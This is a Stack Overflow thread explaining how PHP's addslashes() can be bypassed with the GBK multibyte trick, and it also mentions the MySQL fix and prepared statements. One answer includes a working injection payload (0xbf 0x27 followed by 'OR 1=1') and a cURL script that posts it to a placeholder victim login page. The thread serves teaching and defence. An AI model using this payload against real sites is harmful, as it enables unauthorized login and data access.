<?xml version="1.0" encoding="utf-8"?>
<post><title>php - Examples of SQL Injections through addslashes()? - Stack Overflow</title><question><text><div class="post-text" itemprop="text">
<p>In PHP, I know that <code>mysql_real_escape</code> is much safer than using <code>addslashes</code>.
However, I could not find an example of a situation where <code>addslashes</code> would let an SQL Injection happen.</p>
<p>Can anyone give some examples?</p>
</div></text><author><a href="/users/203458/kate-gregory">Kate Gregory</a></author><comments/></question><answers><answer><text><div class="post-text" itemprop="text">
<p>Well, <a href="http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string" rel="noreferrer">here's the article you want</a>.</p>
<p>Basically, the way the attack works is by getting <code>addslashes()</code> to put a backslash in the middle of a multibyte character such that the backslash loses its meaning by being part of a valid multibyte sequence.</p>
<p>The general caveat from the article:</p>
<blockquote>
<p>This type of attack is possible with any character encoding where
  there is a valid multi-byte character that ends in <code>0x5c</code>, because
  <code>addslashes()</code> can be tricked into creating a valid multi-byte character
  instead of escaping the single quote that follows. UTF-8 does not fit
  this description.</p>
</blockquote>
</div></text><author><a href="/users/47529/chaos">chaos</a></author><comments><comment><text><span class="comment-copy">How about magic quotes? I have seen site who just puts $POST['password'] into the SQL query, and it does not fail for them. Can you explain why does it work?</span></text><author><a class="comment-user" href="/users/78712/elcuco" title="5,246 reputation">elcuco</a></author></comment><comment><text><span class="comment-copy">Magic quotes are a whole 'nother topic; see <a href="http://stackoverflow.com/questions/220437/magic-quotes-in-php">stackoverflow.com/questions/220437/magic-quotes-in-php</a>.  Presumably the example you give 'works' because magic quotes are on.  Among the many reasons not to use magic quotes is that magic quotes uses the same logic as addslashes(), so has the same vulnerability described here.</span></text><author><a class="comment-user" href="/users/47529/chaos" title="92,172 reputation">chaos</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p><a href="http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string" rel="nofollow">Chris Shiflett</a> clearly explains with the bellow example, That will of-course work if you try it when using GBK encoding in your database. Even I tried it, this proves, there are chances for sql injection, even though they are very less, but someone with good knowledge and capability can easily inject. Here is an Example...</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pun">&lt;?</span><span class="pln">php 

       $mysql </span><span class="pun">=</span><span class="pln"> array</span><span class="pun">();</span><span class="pln">
       $db </span><span class="pun">=</span><span class="pln"> mysqli_init</span><span class="pun">();</span><span class="pln">
       $db</span><span class="pun">-&gt;</span><span class="pln">real_connect</span><span class="pun">(</span><span class="str">'localhost'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'myuser'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'mypass'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'mydb'</span><span class="pun">);</span><span class="pln">

       </span><span class="com">/* SQL Injection Example */</span><span class="pln">

       $_POST</span><span class="pun">[</span><span class="str">'username'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> chr</span><span class="pun">(</span><span class="lit">0xbf</span><span class="pun">)</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> chr</span><span class="pun">(</span><span class="lit">0x27</span><span class="pun">)</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> </span><span class="str">' OR username = username /*'</span><span class="pun">;</span><span class="pln">
       $_POST</span><span class="pun">[</span><span class="str">'password'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">'guess'</span><span class="pun">;</span><span class="pln">

       $mysql</span><span class="pun">[</span><span class="str">'username'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> addslashes</span><span class="pun">(</span><span class="pln">$_POST</span><span class="pun">[</span><span class="str">'username'</span><span class="pun">]);</span><span class="pln">
       $mysql</span><span class="pun">[</span><span class="str">'password'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> addslashes</span><span class="pun">(</span><span class="pln">$_POST</span><span class="pun">[</span><span class="str">'password'</span><span class="pun">]);</span><span class="pln">

       $sql </span><span class="pun">=</span><span class="pln"> </span><span class="str">"SELECT * FROM   users
               WHERE username = '{$mysql['username']}'
               AND password = '{$mysql['password']}'"</span><span class="pun">;</span><span class="pln">

       $result </span><span class="pun">=</span><span class="pln"> $db</span><span class="pun">-&gt;</span><span class="pln">query</span><span class="pun">(</span><span class="pln">$sql</span><span class="pun">);</span><span class="pln">

       </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">$result</span><span class="pun">-&gt;</span><span class="pln">num_rows</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
              </span><span class="com">/* Success */</span><span class="pln">
       </span><span class="pun">}</span><span class="pln"> </span><span class="kwd">else</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
              </span><span class="com">/* Failure */</span><span class="pln">
       </span><span class="pun">}</span><span class="pln">

</span><span class="pun">?&gt;</span></code></pre>
<p>Although the use of addslashes() or magic_quotes_gpc would normally be considered as somewhat secure, the use of GBK would render them near useless. The following PHP cURL script would be able to make use of the injection, I hope this will help you a bit more to understand:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="pun">&lt;?</span><span class="pln">php

       $url     </span><span class="pun">=</span><span class="pln"> </span><span class="str">"http://www.victimsite.com/login.php"</span><span class="pun">;</span><span class="pln">
       $ref     </span><span class="pun">=</span><span class="pln"> </span><span class="str">"http://www.victimsite.com/index.php"</span><span class="pun">;</span><span class="pln">
       $session </span><span class="pun">=</span><span class="pln"> </span><span class="str">"PHPSESSID=abcdef01234567890abcdef01"</span><span class="pun">;</span><span class="pln">

       $ch      </span><span class="pun">=</span><span class="pln"> curl_init</span><span class="pun">();</span><span class="pln">

       curl_setopt</span><span class="pun">(</span><span class="pln"> $ch</span><span class="pun">,</span><span class="pln"> CURLOPT_URL</span><span class="pun">,</span><span class="pln">            $url     </span><span class="pun">);</span><span class="pln">
       curl_setopt</span><span class="pun">(</span><span class="pln"> $ch</span><span class="pun">,</span><span class="pln"> CURLOPT_REFERER</span><span class="pun">,</span><span class="pln">        $ref     </span><span class="pun">);</span><span class="pln">
       curl_setopt</span><span class="pun">(</span><span class="pln"> $ch</span><span class="pun">,</span><span class="pln"> CURLOPT_RETURNTRANSFER</span><span class="pun">,</span><span class="pln"> TRUE     </span><span class="pun">);</span><span class="pln">
       curl_setopt</span><span class="pun">(</span><span class="pln"> $ch</span><span class="pun">,</span><span class="pln"> CURLOPT_COOKIE</span><span class="pun">,</span><span class="pln">         $session </span><span class="pun">);</span><span class="pln">
       curl_setopt</span><span class="pun">(</span><span class="pln"> $ch</span><span class="pun">,</span><span class="pln"> CURLOPT_POST</span><span class="pun">,</span><span class="pln">           TRUE     </span><span class="pun">);</span><span class="pln">
       curl_setopt</span><span class="pun">(</span><span class="pln"> $ch</span><span class="pun">,</span><span class="pln"> CURLOPT_POSTFIELDS</span><span class="pun">,</span><span class="pln">     </span><span class="str">"username="</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> chr</span><span class="pun">(</span><span class="lit">0xbf</span><span class="pun">)</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> chr</span><span class="pun">(</span><span class="lit">0x27</span><span class="pun">)</span><span class="pln"> </span><span class="pun">.</span><span class="pln">
                                                 </span><span class="str">"OR 1=1/*&amp;submit=1"</span><span class="pln"> </span><span class="pun">);</span><span class="pln">

       $data </span><span class="pun">=</span><span class="pln"> curl_exec</span><span class="pun">(</span><span class="pln"> $ch </span><span class="pun">);</span><span class="pln">

       </span><span class="kwd">print</span><span class="pun">(</span><span class="pln"> $data </span><span class="pun">);</span><span class="pln">
       curl_close</span><span class="pun">(</span><span class="pln"> $ch </span><span class="pun">);</span><span class="pln">
 </span><span class="pun">?&gt;</span></code></pre>
</div></text><author><a href="/users/995113/scorpion">ScoRpion</a></author><comments/></answer><answer><text><div class="post-text" itemprop="text">
<p>As an addition for the readers of the answers here: This MySQL bug has already been fixed:)</p>
<p>Also, it is always good practice to use prepared statements. It is the most exploit-free way you can fire queries (and, in several use cases the most performant). And it would have saved you from this flaw.</p>
</div></text><author><a href="/users/857958/nico-gawenda">nico gawenda</a></author><comments><comment><text><span class="comment-copy">Can you mention your source on this bug fix? Thanks!</span></text><author><a class="comment-user" href="/users/634286/rationalboss" title="4,687 reputation">rationalboss</a></author></comment><comment><text><span class="comment-copy"><a href="http://dev.mysql.com/doc/refman/5.0/en/news-5-0-22.html" rel="nofollow noreferrer">dev.mysql.com/doc/refman/5.0/en/news-5-0-22.html</a></span></text><author><a class="comment-user" href="/users/857958/nico-gawenda" title="2,066 reputation">nico gawenda</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p><a href="http://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html" rel="nofollow">mysql_real_escape_string() versus Prepared Statements</a> clearly explains <strong>mysql_real_escape_string() isn't 100% secure</strong>.</p>
<p>using <strong>mysql_set_charset('GBK')</strong> to replace <strong>mysql_query("SET CHARACTER SET 'GBK'")</strong>, the mysql_real_escape_string() can be 100% secure.</p>
</div></text><author><a href="/users/1249412/ajaxhe">ajaxhe</a></author><comments/></answer></answers></post>